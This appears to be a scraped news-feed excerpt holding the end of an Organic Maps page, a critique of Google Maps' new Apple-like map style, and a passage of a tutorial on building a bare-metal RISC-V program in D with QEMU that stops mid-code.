<p><a rel="noopener" target="_blank" href="https://www.mythic-beasts.com/">Mythic Beasts</a> ISP <a rel="noopener" target="_blank" href="https://www.mythic-beasts.com/blog/2021/10/06/improving-the-world-bit-by-expensive-bit/">provides us</a> two virtual servers with 400 TB/month of free bandwidth to help our users with maps downloads and updates.</p>

<p>Organic Maps is an <a rel="noopener" target="_blank" href="https://github.com/organicmaps/organicmaps">open-source software</a> licensed under the Apache License 2.0.</p>
<ul>
<li>Please join our beta program, suggest your features, and report bugs:
<ul>
<li><a rel="noopener" target="_blank" href="https://testflight.apple.com/join/lrKCl08I">iOS Beta (TestFlight)</a></li>
<li><a rel="noopener" target="_blank" href="https://appdistribution.firebase.dev/i/9ec3bca5e2b47373">Android Beta (Firebase)</a></li>
<li><a rel="noopener" target="_blank" href="https://flathub.org/apps/details/app.organicmaps.desktop">Linux Desktop Beta (Flatpak)</a></li>
<li><a rel="noopener" target="_blank" href="https://repology.org/project/organicmaps/versions">Linux Desktop Beta (packages)</a></li>
</ul>
</li>
<li>Report bugs or issues to <a rel="noopener" target="_blank" href="https://github.com/organicmaps/organicmaps/issues">the issue tracker</a> or <a href="https://organicmaps.app/cdn-cgi/l/email-protection#20535550504f5254604f5247414e49434d4150530e415050">email us</a>.</li>
<li><a rel="noopener" target="_blank" href="https://github.com/organicmaps/organicmaps/discussions/categories/ideas">Discuss</a> ideas or propose feature requests.</li>
<li>Subscribe to our <a rel="noopener" target="_blank" href="https://t.me/OrganicMapsApp">Telegram Channel</a> or to the <a rel="noopener" target="_blank" title="Organic Maps on the Matrix" href="https://matrix.to/#/#organicmaps:matrix.org">matrix space</a> for updates.</li>
<li>Join our <a rel="noopener" target="_blank" href="https://t.me/OrganicMaps">Telegram Group</a> to discuss with other users.</li>
<li>Visit our <a rel="noopener" target="_blank" href="https://github.com/organicmaps/organicmaps">GitHub page</a>.</li>
<li>Follow our updates in <a rel="noopener" target="_blank" href="https://fosstodon.org/@organicmaps">Mastodon</a>, <a rel="noopener" target="_blank" href="https://facebook.com/OrganicMaps">Facebook</a>, <a rel="noopener" target="_blank" href="https://twitter.com/OrganicMapsApp">Twitter</a>, <a rel="noopener" target="_blank" href="https://instagram.com/organicmaps.app/">Instagram</a>, <a rel="noopener" target="_blank" href="https://www.reddit.com/r/organicmaps/">Reddit</a>, <a rel="noopener" target="_blank" href="https://linkedin.com/company/organic-maps">LinkedIn</a>.</li>
</ul>





</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Google Maps Testing New Apple Maps-Inspired Map Style (125 pts)]]></title>
            <link>https://www.justinobeirne.com/google-maps-testing-new-apple-maps-inspired-map-style</link>
            <guid>37346767</guid>
            <pubDate>Fri, 01 Sep 2023 04:21:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.justinobeirne.com/google-maps-testing-new-apple-maps-inspired-map-style">https://www.justinobeirne.com/google-maps-testing-new-apple-maps-inspired-map-style</a>, See on <a href="https://news.ycombinator.com/item?id=37346767">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-type="page" data-updated-on="1693539595036" id="content" data-content-field="main-content"><div data-block-type="44" id="block-yui_3_17_2_1_1693526221740_1786"><center data-preserve-html-node="true"><h2 data-preserve-html-node="true"><span data-preserve-html-node="true"><b data-preserve-html-node="true">Google Maps Testing New Apple Maps-Inspired Map Style</b></span><br data-preserve-html-node="true"><span data-preserve-html-node="true">August 2023</span></h2></center>


<p data-preserve-html-node="true">Back in <b data-preserve-html-node="true">August 2020</b>, Google <a data-preserve-html-node="true" href="https://www.justinobeirne.com/google-maps-adds-detailed-landcover">began testing</a> a seemingly Apple Maps-inspired map style that added darker and deeper landcover colors throughout the world:</p>
</div><div data-block-type="44" id="block-yui_3_17_2_1_1693526493487_5448">
<p data-preserve-html-node="true">While some areas, like deserts, looked much improved...</p>
</div><div data-block-type="44" id="block-yui_3_17_2_1_1693526493487_6783">
<p data-preserve-html-node="true">...other areas, like metropolitan areas, became harder to read:</p>

</div><div data-block-type="44" id="block-yui_3_17_2_1_1693526493487_9926">
<p data-preserve-html-node="true">And areas with lots of hills and mountains became especially cluttered and difficult to scan:</p>
</div><div data-block-type="44" id="block-yui_3_17_2_1_1693526493487_10921">
<p data-preserve-html-node="true">For the past three years, Google’s cartography has largely remained in this difficult-to-scan state—that is, until now. That’s because <b data-preserve-html-node="true">as of late August 2023, Google appears to be testing a new Apple Maps-inspired map style</b>.</p>

<p data-preserve-html-node="true" id="back-note1">Unfortunately, Google’s new, in-testing map style is even worse than its old one. Here in Chicago, for instance, notice how much harder it is to read and scan the map:<sup data-preserve-html-node="true"><a data-preserve-html-node="true" href="#note1">1</a></sup></p>
</div><div data-block-type="44" id="block-yui_3_17_2_1_1693526493487_15283">
<p data-preserve-html-node="true">And the same goes for New York City:</p>
</div><div data-block-type="44" id="block-yui_3_17_2_1_1693526493487_17156"><p data-preserve-html-node="true">The new New York map above looks comically bad, almost like student-level work.</p>

<p data-preserve-html-node="true">It’s difficult to understand Google’s motivations for making such garish changes—that is, until you zoom in further on New York or any of the other three cities where Google <a data-preserve-html-node="true" href="https://www.justinobeirne.com/google-maps-releases-road-markings-4-cities">recently added road markings</a>.</p>

<p data-preserve-html-node="true">Here you see that Google seems to be attempting to mimic the look of Apple’s “Detailed City Experience”, particularly the roads:</p>
</div><div data-block-type="44" id="block-yui_3_17_2_1_1693531995460_10009">
<p data-preserve-html-node="true">If Google’s aim was to make its map look more like Apple’s, then it succeeded:</p>

</div><div data-block-type="44" id="block-yui_3_17_2_1_1693532818477_46712">
<p data-preserve-html-node="true">But in many other ways, the experience is even worse than before. Case-in-point: the traffic display, which is now even harder to parse:</p> 
</div><div data-block-type="44" id="block-yui_3_17_2_1_1693526493487_62885"><p data-preserve-html-node="true">It increasingly feels as if Google Maps has gotten lost.</p>


<p data-preserve-html-node="true"><b data-preserve-html-node="true">__</b></p>

<p data-preserve-html-node="true" id="note1"><b data-preserve-html-node="true">1</b>&nbsp;&nbsp;Here’s a reminder of how much nicer Google Maps used to look (particularly back in 2018):</p>



</div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Writing a bare-metal RISC-V application in D (109 pts)]]></title>
            <link>https://zyedidia.github.io/blog/posts/1-d-baremetal/</link>
            <guid>37346218</guid>
            <pubDate>Fri, 01 Sep 2023 02:50:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://zyedidia.github.io/blog/posts/1-d-baremetal/">https://zyedidia.github.io/blog/posts/1-d-baremetal/</a>, See on <a href="https://news.ycombinator.com/item?id=37346218">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p>This post will show you how to use D to write a bare-metal “Hello world”
program that targets the RISC-V QEMU simulator.  In a future blog post (<a href="https://zyedidia.github.io/blog/posts/2-baremetal-visionfive">now
available</a>) we’ll build on this to target actual
hardware: the <a href="https://www.kickstarter.com/projects/starfive/visionfive-2">VisionFive
2</a> SBC. See
<a href="https://github.com/zyedidia/blog-code">blog-code</a> for the final code from
this post. For a more complex example, see
<a href="https://github.com/zyedidia/multiplix">Multiplix</a>, an operating system I am
developing that runs on the VisionFive 2 (and Raspberry Pis).</p>
<h2 id="why-d">Why D?</h2>
<p>Recently I’ve been writing bare-metal code in C, and I’ve become a bit
frustrated with the lack of features that C provides. I started searching for a
good replacement, and revisited <a href="https://dlang.org/">D</a> (a language I used for a
project a few years ago).  It turns out D has introduced a mode called
<a href="https://dlang.org/spec/betterc.html">betterC</a><sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> (sounds exactly like what I
want), which essentially disables all language features that require the D
runtime. This makes it roughly as easy to use D for bare-metal programming as
C. You don’t get all the features of D, but you get enough that it covers all
the things I want (in fact, for systems programming I prefer the betterC subset
of D over full D). D in betterC mode is exactly what it sounds like, and
retains the feel of C – going forward I think I will be using it instead of C
in all situations where I would have otherwise used C (even in non-bare-metal
situations).</p>
<p>Here are the positives about D I value most:</p>
<ul>
<li>A decent import system (no more header files and <code>#include</code>).</li>
<li>Automatic bounds checking, and bounded strings and arrays.</li>
<li>Methods in structs.</li>
<li>Compile-time code evaluation (run D code at compile-time!).</li>
<li>Powerful templating and generics.</li>
<li>Iterators.</li>
<li>Default support for thread-local storage.</li>
<li>Scope guards and RAII.</li>
<li>Some memory safety protections with <code>@safe</code>.</li>
<li>A fairly comprehensive and readable <a href="https://dlang.org/spec/spec.html">online specification</a>.</li>
<li>An active discord channel with people that answer my questions in minutes.</li>
<li>Both an LLVM-based compiler (LDC) and a GNU compiler (GDC), which is officially
part of the GCC project.
<ul>
<li>And these compilers both export roughly the same flags and intrinsics as
Clang and GCC respectively.</li>
</ul>
</li>
</ul>
<p>These features, combined with the lack of a runtime and the C-like feel of the
language (making it easy to port previous code), make it a no-brainer for me to
have D as the base choice for any project where I would otherwise use C.</p>

<p>Now that I’ve told you about my reasons for choosing D, let’s try using it to
write a bare-metal application that targets RISC-V. If you want to follow
along, the first step is to download the toolchain (the following tools should
work on Linux or MacOS). You’ll need three different components:</p>
<ol>
<li>LDC 1.30 (the LLVM-based D compiler). Can be downloaded from
<a href="https://github.com/ldc-developers/ldc/releases/tag/v1.30.0">GitHub</a>. Make sure to
use version 1.30<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>.</li>
<li>A <code>riscv64-unknown-elf</code> GNU toolchain. Can be downloaded from
SiFive’s <a href="https://github.com/sifive/freedom-tools/releases">Freedom Tools
repository</a>.</li>
<li>The QEMU RISC-V simulator: <code>qemu-system-riscv64</code>. Can be downloaded from
SiFive’s <a href="https://github.com/sifive/freedom-tools/releases">Freedom Tools
repository</a>, or also
usually available as part of your system’s QEMU package.</li>
</ol>
<p>We’ll be using LDC since it ships with the ability to target <code>riscv64</code>.  I have
used GDC for bare-metal development as well, but it requires building a
toolchain from source since nobody ships pre-built <code>riscv64-unknown-elf-gdc</code>
binaries<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>. We’ll use the GNU toolchain for assembling, linking, and for other
tools like <code>objcopy</code> and <code>objdump</code>, and QEMU for simulating the hardware.</p>
<p>With these installed you should be able to run:</p>
<div><pre tabindex="0"><code data-lang="txt"><span><span>$ ldc2 --version
</span></span><span><span>LDC - the LLVM D compiler (1.30.0):
</span></span><span><span>...
</span></span><span><span>
</span></span><span><span>$ riscv64-unknown-elf-ld
</span></span><span><span>riscv64-unknown-elf-ld: no input files
</span></span><span><span>
</span></span><span><span>$ qemu-system-riscv64 -h
</span></span><span><span>...
</span></span></code></pre></div><h2 id="cpu-entrypoint">CPU entrypoint</h2>
<p>We’re writing bare-metal code, so there’s no operating system, no console, no
files – nothing. The CPU just starts executing instructions at a pre-specified
address<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup> after performing some initial setup. We’ll figure out what that
address is later when we set up the linkerscript. For now we can just define
the <code>_start</code> symbol as our entrypoint, and assume the linker will place the
code at this label at the CPU entrypoint.</p>
<p>A D function requires a valid stack pointer, so before we can execute any D code
we need to load the stack pointer register <code>sp</code> with a valid address.</p>
<p>Let’s make a file called <code>start.s</code> and put the following in it:</p>
<div><pre tabindex="0"><code data-lang="asm"><span><span><span>.section</span> <span>".text.boot"</span>
</span></span><span><span>
</span></span><span><span><span>.globl</span> <span>_start</span>
</span></span><span><span><span>_start:</span>
</span></span><span><span>    <span>la</span> <span>sp</span>, <span>_stack_start</span>
</span></span><span><span>    <span>call</span> <span>dstart</span>
</span></span><span><span><span>_hlt:</span>
</span></span><span><span>    <span>j</span> <span>_hlt</span>
</span></span></code></pre></div><p>For now let’s assume <code>_stack_start</code> is a symbol with the address of a valid
stack, and in the linkerscript we’ll set this up properly. After loading <code>sp</code>,
we call a D function called <code>dstart</code>, defined in the next part.</p>
<h2 id="d-entrypoint">D entrypoint</h2>
<p>Now we can define our <code>dstart</code> function in <code>dstart.d</code>. For now we’ll just cause
an infinite loop.</p>
<div><pre tabindex="0"><code data-lang="d"><span><span><span>module</span> <span>dstart</span><span>;</span>
</span></span><span><span>
</span></span><span><span>extern <span>(</span>C<span>)</span> <span>void</span> <span>dstart</span><span>()</span> <span>{</span>
</span></span><span><span>    <span>while</span> <span>(</span><span>1</span><span>)</span> <span>{}</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><h2 id="linkerscript">Linkerscript</h2>
<p>Before we can compile this program we need a bit of linkerscript to tell the
linker how our code should be laid out. We’ll need to specify the address where
the text section should start (the entry address), and reserve space for all
the data sections (<code>.rodata</code>, <code>.data</code>, <code>.bss</code>), and the stack.</p>
<h2 id="entry-address">Entry address</h2>
<p>Today we’ll be targeting the QEMU <code>virt</code> RISC-V machine, so we have
to figure out what its entrypoint is.</p>
<p>We can ask QEMU for a list of all devices in the <code>virt</code> machine by telling it
to dump the its device tree:</p>
<div><pre tabindex="0"><code data-lang="txt"><span><span>$ qemu-system-riscv64 -machine virt,dumpdtb=virt.dtb
</span></span><span><span>$ dtc virt.dtb &gt; virt.dts
</span></span></code></pre></div><p>In <code>virt.dts</code> you’ll find the following entry:</p>
<div><pre tabindex="0"><code data-lang="txt"><span><span>memory@80000000 {
</span></span><span><span>    device_type = "memory";
</span></span><span><span>    reg = &lt;0x00 0x80000000 0x00 0x8000000&gt;;
</span></span><span><span>};
</span></span></code></pre></div><p>This means that RAM starts at address <code>0x80000000</code> (everything below is special
memory or inaccessible). The CPU entrypoint for the <code>virt</code> machine is the first
instruction in RAM, stored at <code>0x80000000</code>.</p>
<p>In the linkerscript, we need to tell the linker that it should place the
<code>_start</code> function at <code>0x80000000</code>. We do this by telling it to put the
<code>.text.boot</code> section first in the <code>.text</code> section, located at <code>0x80000000</code>.
Then we include the rest of the <code>.text</code> sections, followed by read-only data,
writable data, and the BSS.</p>
<p>In <code>link.ld</code>:</p>
<div><pre tabindex="0"><code data-lang="txt"><span><span>ENTRY(_start)
</span></span><span><span>
</span></span><span><span>SECTIONS
</span></span><span><span>{
</span></span><span><span>    .text 0x80000000 : {
</span></span><span><span>        KEEP(*(.text.boot))  
</span></span><span><span>        *(.text*) 
</span></span><span><span>    }
</span></span><span><span>    .rodata : {
</span></span><span><span>        . = ALIGN(8);
</span></span><span><span>        *(.rodata*)
</span></span><span><span>        *(.srodata*)
</span></span><span><span>        . = ALIGN(8);
</span></span><span><span>    }
</span></span><span><span>    .data : { 
</span></span><span><span>        . = ALIGN(8);
</span></span><span><span>        *(.sdata*)
</span></span><span><span>        *(.data*)
</span></span><span><span>        . = ALIGN(8);
</span></span><span><span>    } 
</span></span><span><span>    .bss : {
</span></span><span><span>        . = ALIGN(8);
</span></span><span><span>        _bss_start = .;
</span></span><span><span>        *(.sbss*)
</span></span><span><span>        *(.bss*)
</span></span><span><span>        *(COMMON)
</span></span><span><span>        . = ALIGN(8);
</span></span><span><span>        _bss_end = .;
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    .kstack : {
</span></span><span><span>        . = ALIGN(16);
</span></span><span><span>        . += 4K;
</span></span><span><span>        _stack_start = .;
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    /DISCARD/ : { *(.comment .note .eh_frame) }
</span></span><span><span>}
</span></span></code></pre></div><h2 id="what-is-the-bss">What is the BSS?</h2>
<p>The BSS is a region of memory that the compiler assumes is initialized to all
zeroes. Usually the static data for a program is directly copied into the ELF
executable – if you have a string <code>"hello world"</code> in your program, those exact
bytes will live somewhere in the binary (in the read-only data section).
However, a lot of static data is initialized to zero, so instead of putting
those zero bytes directly into the ELF file, the linker lets us save space by
making a special section (the BSS) that must be initialized to all zeroes at
runtime, but won’t actually contain that data in the ELF file itself.  So even
if you have a giant 1MB array of zeroes, your ELF binary will be small because
that section will be expanded into RAM only when the application starts.
Usually the OS sets up the BSS before it launches a program, but we’re running
bare-metal, so we have to do that manually in the <code>dstart</code> function (in the
next section).  To make this initialization possible, we define the
<code>_bss_start</code> and <code>_bss_end</code> symbols in the linkerscript. These are symbols
whose <em>addresses</em> will be the start and end of the BSS section respectively.</p>
<h2 id="reserving-space-for-the-stack">Reserving space for the stack</h2>
<p>We also reserve one page for the <code>.kstack</code> section and mark the <code>_stack_start</code>
symbol to be located to the end of it (remember the stack grows down). The
stack must be 16-byte aligned.</p>
<h2 id="compile">Compile!</h2>
<p>Now we have everything we need to compile a basic bare-metal program.</p>
<div><pre tabindex="0"><code data-lang="txt"><span><span>$ ldc2 -Oz -betterC -mtriple=riscv64-unknown-elf -mattr=+m,+a,+c --code-model=medium -c dstart.d
</span></span><span><span>$ riscv64-unknown-elf-as -mno-relax -march=rv64imac start.S -c -o start.o
</span></span><span><span>$ riscv64-unknown-elf-ld -Tlink.ld start.o dstart.o -o prog.elf
</span></span></code></pre></div><p>Let’s look at some of these flags:</p>
<ul>
<li><code>Oz</code>: optimize aggressively for size.</li>
<li><code>betterC</code>: enable betterC mode (disable the built-in D runtime).</li>
<li><code>mtriple=riscv64-unknown-elf</code>: build for the riscv64 bare-metal ELF target.</li>
<li><code>mattr=+m,+a,+c</code>: enable the following RISC-V extensions: <code>m</code>
(multiply/divide), <code>a</code> (atomics), and <code>c</code> (compressed instructions).</li>
<li><code>code-model=medium</code>: <a href="https://www.sifive.com/blog/all-aboard-part-4-risc-v-code-models">code
models</a> in
RISC-V control how pointers to far away locations are constructed. The
<code>medium</code> code model (also called <code>medany</code>) allows us to address any symbol
located within 2 GiB of the current address, and is recommended for 64-bit
programs. See the SiFive post for more information.</li>
<li><code>mno-relax</code>: disables linker relaxation in the assembler (it is already
disabled by default in LDC). Linker relaxation is a RISC-V-specific
optimization that allows the linker to make use of the <code>gp</code> (global pointer)
register.  I explain it in more detail in the <a href="#enabling-linker-relaxation">linker relaxation
section</a>.</li>
</ul>
<p>It’s going to get tedious to type out these commands repeatedly, so let’s
create a Makefile<sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup> (or a <a href="https://github.com/zyedidia/knit">Knitfile</a> if you’re
cool):</p>
<div><pre tabindex="0"><code data-lang="make"><span><span><span>SRC</span><span>=</span><span>$(</span>wildcard *.d<span>)</span>
</span></span><span><span><span>OBJ</span><span>=</span><span>$(</span>SRC:.d<span>=</span>.o<span>)</span>
</span></span><span><span>
</span></span><span><span><span>all</span><span>:</span> prog.bin
</span></span><span><span>
</span></span><span><span><span>%.o</span><span>:</span> %.d
</span></span><span><span>	ldc2 -Oz -betterC -mtriple<span>=</span>riscv64-unknown-elf -mattr<span>=</span>+m,+a,+c,+relax --code-model<span>=</span>medium --makedeps<span>=</span><span>$*</span>.dep $&lt; -c -of <span>$@</span>
</span></span><span><span><span>%.o</span><span>:</span> %.s
</span></span><span><span>	riscv64-unknown-elf-as -march<span>=</span>rv64imac $&lt; -c -o <span>$@</span>
</span></span><span><span><span>prog.elf</span><span>:</span> start.o <span>$(</span><span>OBJ</span><span>)</span>
</span></span><span><span>	riscv64-unknown-elf-ld -Tlink.ld $^ -o <span>$@</span>
</span></span><span><span><span>%.bin</span><span>:</span> %.elf
</span></span><span><span>	riscv64-unknown-elf-objcopy $&lt; -O binary <span>$@</span>
</span></span><span><span><span>%.list</span><span>:</span> %.elf
</span></span><span><span>	riscv64-unknown-elf-objdump -D $&lt; &gt; <span>$@</span>
</span></span><span><span><span>run</span><span>:</span> prog.bin
</span></span><span><span>	qemu-system-riscv64 -nographic -bios none -machine virt -kernel prog.bin
</span></span><span><span><span>clean</span><span>:</span>
</span></span><span><span>	rm -f *.bin *.list *.o *.elf *.dep
</span></span><span><span>
</span></span><span><span><span>-include</span> <span>*.dep</span>
</span></span></code></pre></div><p>and compile with</p>
<p>This file is a raw dump of our program. At this point it clocks in at a
whopping 22 bytes.</p>
<p>To see the disassembled program, run</p>
<div><pre tabindex="0"><code data-lang="txt"><span><span>$ make prog.list
</span></span><span><span>...
</span></span><span><span>$ cat prog.list
</span></span><span><span>prog.elf:     file format elf64-littleriscv
</span></span><span><span>
</span></span><span><span>Disassembly of section .text:
</span></span><span><span>
</span></span><span><span>0000000080000000 &lt;_start&gt;:
</span></span><span><span>    80000000:	00001117          	auipc	sp,0x1
</span></span><span><span>    80000004:	02010113          	addi	sp,sp,32 # 80001020 &lt;_stack_start&gt;
</span></span><span><span>    80000008:	00000097          	auipc	ra,0x0
</span></span><span><span>    8000000c:	00c080e7          	jalr	12(ra) # 80000014 &lt;dstart&gt;
</span></span><span><span>
</span></span><span><span>0000000080000010 &lt;_hlt&gt;:
</span></span><span><span>    80000010:	a001                	j	80000010 &lt;_hlt&gt;
</span></span><span><span>    ...
</span></span><span><span>
</span></span><span><span>0000000080000014 &lt;dstart&gt;:
</span></span><span><span>    80000014:	a001                	j	80000014 &lt;dstart&gt;
</span></span></code></pre></div><p>Looks like our <code>_start</code> function is being linked properly at <code>0x80000000</code> and
has the expected assembly!</p>
<p>If you try to run with</p>
<div><pre tabindex="0"><code data-lang="txt"><span><span>$ make run
</span></span><span><span>qemu-system-riscv64 -nographic -bios none -machine virt -kernel prog.bin
</span></span></code></pre></div><p>it will just enter an infinite loop (press <code>Ctrl-A</code> <code>Ctrl-X</code> to quit QEMU). We
still have a bit more work to do before we get output.</p>
<h2 id="more-setup-initializing-the-bss">More setup: initializing the BSS</h2>
<p>Now let’s modify <code>dstart</code> to initialize the BSS. We need to declare some
<code>extern</code> variables so that the linker symbols <code>_bss_start</code> and <code>_bss_end</code> are
available to our D code. Then we can just loop from <code>_bss_start</code> to <code>_bss_end</code>
and assign all the bytes in that range to zero. Once complete, our BSS is
initialized and we can run arbitrary<sup id="fnref:6"><a href="#fn:6" role="doc-noteref">6</a></sup> D code (using globals that may be
initialized to zero).</p>
<div><pre tabindex="0"><code data-lang="d"><span><span>extern <span>(</span>C<span>)</span> <span>{</span>
</span></span><span><span>    extern <span>__gshared</span> <span>uint</span> _bss_start<span>,</span> _bss_end<span>;</span>
</span></span><span><span>
</span></span><span><span>    <span>void</span> <span>dstart</span><span>()</span> <span>{</span>
</span></span><span><span>        <span>uint</span><span>*</span> bss <span>=</span> <span>&amp;</span>_bss_start<span>;</span>
</span></span><span><span>        <span>uint</span><span>*</span> bss_end <span>=</span> <span>&amp;</span>_bss_end<span>;</span>
</span></span><span><span>        <span>while</span> <span>(</span>bss <span>&lt;</span> bss_end<span>)</span> <span>{</span>
</span></span><span><span>            <span>*</span>bss<span>++</span> <span>=</span> <span>0</span><span>;</span>
</span></span><span><span>        <span>}</span>
</span></span><span><span>
</span></span><span><span>        <span>import</span> <span>main</span><span>;</span>
</span></span><span><span>        kmain<span>();</span>
</span></span><span><span>    <span>}</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><p>And in <code>main.d</code> we have our bare-metal main entrypoint:</p>
<div><pre tabindex="0"><code data-lang="d"><span><span><span>module</span> <span>main</span><span>;</span>
</span></span><span><span>
</span></span><span><span><span>void</span> <span>kmain</span><span>()</span> <span>{}</span>
</span></span></code></pre></div><h2 id="creating-a-minimal-d-runtime">Creating a minimal D runtime</h2>
<p>Several D language features are unavailable because of our lack of runtime. For
example, types such as <code>string</code> and <code>size_t</code> are undefined, and we can’t use
assertions (we’ll get to those later). The first step to creating a minimal
runtime is to create an <code>object.d</code> file. The D compiler will search for this
special file and import it automatically everywhere. So we can create
definitions for types like <code>string</code> and <code>size_t</code> here. Here is the minimal
definition I like to use, which also defines <code>ptrdiff_t</code>, <code>noreturn</code>, and
<code>uintptr</code>.</p>
<div><pre tabindex="0"><code data-lang="d"><span><span><span>module</span> <span>object</span><span>;</span>
</span></span><span><span>
</span></span><span><span><span>alias</span> <span>string</span> <span>=</span> immutable<span>(</span><span>char</span><span>)[];</span>
</span></span><span><span><span>alias</span> size_t <span>=</span> typeof<span>(</span><span>int</span><span>.</span><span>sizeof</span><span>);</span>
</span></span><span><span><span>alias</span> ptrdiff_t <span>=</span> typeof<span>(</span><span>cast</span><span>(</span><span>void</span><span>*)</span> <span>0</span> <span>-</span> <span>cast</span><span>(</span><span>void</span><span>*)</span> <span>0</span><span>);</span>
</span></span><span><span>
</span></span><span><span><span>alias</span> noreturn <span>=</span> typeof<span>(*</span><span>null</span><span>);</span>
</span></span><span><span>
</span></span><span><span><span>static</span> <span>if</span> <span>((</span><span>void</span><span>*).</span><span>sizeof</span> <span>==</span> <span>8</span><span>)</span> <span>{</span>
</span></span><span><span>    <span>alias</span> uintptr <span>=</span> <span>ulong</span><span>;</span>
</span></span><span><span><span>}</span> <span>else</span> <span>static</span> <span>if</span> <span>((</span><span>void</span><span>*).</span><span>sizeof</span> <span>==</span> <span>4</span><span>)</span> <span>{</span>
</span></span><span><span>    <span>alias</span> uintptr <span>=</span> <span>uint</span><span>;</span>
</span></span><span><span><span>}</span> <span>else</span> <span>{</span>
</span></span><span><span>    <span>static</span> <span>assert</span><span>(</span><span>0</span><span>,</span> <span>"pointer size must be 4 or 8 bytes"</span><span>);</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><h2 id="writing-to-the-uart-device">Writing to the UART device</h2>
<p>Most systems have a UART device. Generally how this works is that you write a
byte to a special place in memory<sup id="fnref:7"><a href="#fn:7" role="doc-noteref">7</a></sup>, and that byte will be transmitted using the
UART protocol over some pins on the board. In order to read the bytes with your
host computer you need a UART to USB adapter plugged into your host, and then
you can read from the corresponding device file (usually <code>/dev/ttyUSB0</code>) on the
host computer. Today we’ll just be simulating our bare-metal code in QEMU, so
you don’t need to have a special adapter. QEMU will emulate a UART device and
print out the bytes written to its transmit register.</p>
<h2 id="enabling-volatile-loadsstores">Enabling volatile loads/stores</h2>
<p>When writing to device memory it is important to ensure that the compiler does
not remove our loads/stores. For example, if a device is located at
<code>0x10000000</code>, we might write directly to that address by casting the integer to
a pointer. To the compiler, it just looks like we are writing to random
addresses, which might be undefined behavior or result in dead code (e.g., if
we never read the value back, the compiler may determine that it can eliminate
the write). We need to inform the compiler that these reads/writes of device
memory must be preserved and cannot be optimized out. D uses the
<code>volatileStore</code> and <code>volatileLoad</code> intrinsics for this.</p>
<p>We can define these in our <code>object.d</code>:</p>
<div><pre tabindex="0"><code data-lang="d"><span><span><span>pragma</span><span>(</span>LDC_intrinsic<span>,</span> <span>"ldc.bitop.vld"</span><span>)</span> <span>ubyte</span> <span>volatileLoad</span><span>(</span><span>ubyte</span><span>*</span> ptr<span>);</span>
</span></span><span><span><span>pragma</span><span>(</span>LDC_intrinsic<span>,</span> <span>"ldc.bitop.vld"</span><span>)</span> <span>ushort</span> <span>volatileLoad</span><span>(</span><span>ushort</span><span>*</span> ptr<span>);</span>
</span></span><span><span><span>pragma</span><span>(</span>LDC_intrinsic<span>,</span> <span>"ldc.bitop.vld"</span><span>)</span> <span>uint</span> <span>volatileLoad</span><span>(</span><span>uint</span><span>*</span> ptr<span>);</span>
</span></span><span><span><span>pragma</span><span>(</span>LDC_intrinsic<span>,</span> <span>"ldc.bitop.vld"</span><span>)</span> <span>ulong</span> <span>volatileLoad</span><span>(</span><span>ulong</span><span>*</span> ptr<span>);</span>
</span></span><span><span><span>pragma</span><span>(</span>LDC_intrinsic<span>,</span> <span>"ldc.bitop.vst"</span><span>)</span> <span>void</span> <span>volatileStore</span><span>(</span><span>ubyte</span><span>*</span> ptr<span>,</span> <span>ubyte</span> value<span>);</span>
</span></span><span><span><span>pragma</span><span>(</span>LDC_intrinsic<span>,</span> <span>"ldc.bitop.vst"</span><span>)</span> <span>void</span> <span>volatileStore</span><span>(</span><span>ushort</span><span>*</span> ptr<span>,</span> <span>ushort</span> value<span>);</span>
</span></span><span><span><span>pragma</span><span>(</span>LDC_intrinsic<span>,</span> <span>"ldc.bitop.vst"</span><span>)</span> <span>void</span> <span>volatileStore</span><span>(</span><span>uint</span><span>*</span> ptr<span>,</span> <span>uint</span> value<span>);</span>
</span></span><span><span><span>pragma</span><span>(</span>LDC_intrinsic<span>,</span> <span>"ldc.bitop.vst"</span><span>)</span> <span>void</span> <span>volatileStore</span><span>(</span><span>ulong</span><span>*</span> ptr<span>,</span> <span>ulong</span> value<span>);</span>
</span></span></code></pre></div><h2 id="controlling-the-uart">Controlling the UART</h2>
<p>With that set up, let’s figure out where QEMU’s UART device is located in
memory so we can write to it.</p>
<p>The QEMU <code>virt</code> machine defines a number of virtual devices, one of which is a
UART device. Looking through the QEMU device tree again in <code>virt.dts</code>, you’ll
see the following:</p>
<div><pre tabindex="0"><code data-lang="txt"><span><span>uart@10000000 {
</span></span><span><span>    interrupts = &lt;0x0a&gt;;
</span></span><span><span>    interrupt-parent = &lt;0x03&gt;;
</span></span><span><span>    clock-frequency = &lt;0x384000&gt;;
</span></span><span><span>    reg = &lt;0x00 0x10000000 0x00 0x100&gt;;
</span></span><span><span>    compatible = "ns16550a";
</span></span><span><span>};
</span></span></code></pre></div><p>This says that a ns16550a UART device exists at address <code>0x10000000</code>.</p>
<p>On real hardware the UART would need to be properly initialized by writing some
memory-mapped configuration registers (for setting up the baud rate and other
options). However the QEMU device does not require initialization. It emulates
an ns16550a device, and writing to its transmit register is enough to cause a
byte to be written over the UART (which appears on the console when simulating
with QEMU). The transmit register for the ns16550a is the first mapped register,
so it is located at <code>0x10000000</code>.</p>
<p>In <code>uart.d</code>:</p>
<div><pre tabindex="0"><code data-lang="d"><span><span><span>module</span> <span>uart</span><span>;</span>
</span></span><span><span>
</span></span><span><span><span>struct</span> <span>Ns16650a</span><span>(</span><span>ubyte</span><span>*</span> base<span>)</span> <span>{</span>
</span></span><span><span>    <span>static</span> <span>void</span> <span>tx</span><span>(</span><span>ubyte</span> b<span>)</span> <span>{</span>
</span></span><span><span>        volatileStore<span>(</span>base<span>,</span> b<span>);</span>
</span></span><span><span>    <span>}</span>
</span></span><span><span><span>}</span>
</span></span><span><span>
